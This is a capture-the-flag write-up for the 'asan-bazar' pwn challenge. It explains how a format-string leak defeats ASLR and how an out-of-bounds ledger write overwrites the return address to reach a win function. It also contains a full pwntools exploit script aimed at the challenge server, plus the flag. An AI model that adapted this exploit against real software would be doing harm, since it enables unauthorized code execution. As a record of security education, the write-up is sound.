# ASan-Bazar Writeup

## Challenge Overview

**Challenge**: `asan-bazar`
**Category**: Pwn
**Description**: Decompiled code shows a "Goblin Bazaar" managed with AddressSanitizer (ASan) instrumentation. The challenge involves bypassing ASan protections to exploit the binary.

## Vulnerabilities

### 1. Format String Vulnerability

The `greeting` function contains a classic format string vulnerability:

```c
printf((char *)v14, v7);
```

`v14` points to the user-supplied `Name`. This allows us to leak addresses from the stack, specifically:

- **Return Address**: Located at a high offset on the stack (Arg 79 in our analysis). Leaking this reveals the **PIE base** address, critical for defeating ASLR.
- **Stack Canaries/Base Pointers**: Although not strictly necessary here, this primitive is powerful.

### 2. Arbitrary Write (The "Scribe")

The "scribe" feature allows updating the `ledger`:

```c
u32 = read_u32("[scribe] Choose where to start (slot index 0..128):", v3);
// ... checks u32 <= 0x80 ...
v21 = read_u32("[scribe] Choose a tiny adjustment inside the slot (0..15):", v3);
// ... checks v21 <= 0xF ...
v19 = v21 + 16LL * u32;
read(0LL, (__asan *)((char *)v13 + v19));
```

`v13` points to the `ledger` buffer (local stack variable).
The maximum offset is `16 * 128 + 15 = 2063` bytes.
The stack frame for `greeting` is only 352 bytes (`v16` allocation).
The `ledger` starts at offset `192` within `v16`.
The return address is located _after_ the stack frame.
ASan poisons memory _around_ variables on the stack (redzones), but it does not always protect the Return Address saved by the `call` instruction, especially if we can write far enough past the legitimate buffers.
We calculate the offset to the Return Address relative to `ledger` and overwrite it.

## Exploitation Strategy

1.  **Leak PIE Base**:
    - Connect and send `%79$p` (or verify the correct offset dynamically) as the Name.
    - Receive the leak, which is a code pointer (Return Address).
    - Calculate `PIE_BASE = LEAK - OFFSET`.
    - Calculate `WIN_ADDR = PIE_BASE + WIN_OFFSET`.

2.  **Calculate Write Offset**:
    - The Return Address is at a specific stack offset relative to `ledger`.
    - In our analysis, this offset was around `392` bytes.
    - `392 = 16 * 24 + 8`.
    - So, we use `Slot = 24`, `Adjustment = 8`.

3.  **Overwrite RET**:
    - Select the calculated Slot and Adjustment.
    - Write 8 bytes (the address of `win`).
    - The function returns, executing `win`.

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
HOST = "52.59.124.14"
PORT = 5030

LEAK_OFFSET_VAL = 0xdc052
WIN_OFFSET_VAL = 0xdbed0

def exploit():
    try:
        io = remote(HOST, PORT)

        # 1. Leak Return Address (Arg 70-90 scan)
        io.recvuntil(b'Name:\n')
        parts_list = [f"%{i}$p" for i in range(70, 90)]
        payload = "|".join(parts_list)
        io.sendline(payload.encode())

        io.recvuntil(b"market:\n")
        leak_line = io.recvline().decode().strip()
        parts = leak_line.split('|')

        ret_idx = -1
        leak_val = 0

        # Find the return address (ends in 052)
        for i, part in enumerate(parts):
            if part == '(nil)' or not part.startswith('0x'): continue
            val = int(part, 16)
            if (val & 0xfff) == (LEAK_OFFSET_VAL & 0xfff):
                ret_idx = 70 + i
                leak_val = val
                break

        if ret_idx == -1:
            print("No matching RET found.")
            return

        pie_base = leak_val - LEAK_OFFSET_VAL
        win_addr = pie_base + WIN_OFFSET_VAL

        # Calculate Offset: (RET_INDEX - 10) * 8 - 160
        # Arg 10 is start of buffer
        offset = (ret_idx - 10) * 8 - 160
        slot = offset // 16
        adj = offset % 16

        print(f"Computed Offset: {offset} (Slot {slot}, Adj {adj})")

        # 2. Overwrite RET
        io.recvuntil(b'slot index 0..128):\n')
        io.sendline(str(slot).encode())
        io.recvuntil(b'adjustment inside the slot (0..15):\n')
        io.sendline(str(adj).encode())
        io.recvuntil(b'How many bytes of ink? (max 8):\n')
        io.sendline(b'8')
        io.recvuntil(b'Ink (raw bytes):\n')
        io.send(p64(win_addr))

        io.interactive()

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()
```

## Flag

`ENO{COMPILING_WITH_ASAN_DOESNT_ALWAYS_MEAN_ITS_SAFE!!!}`
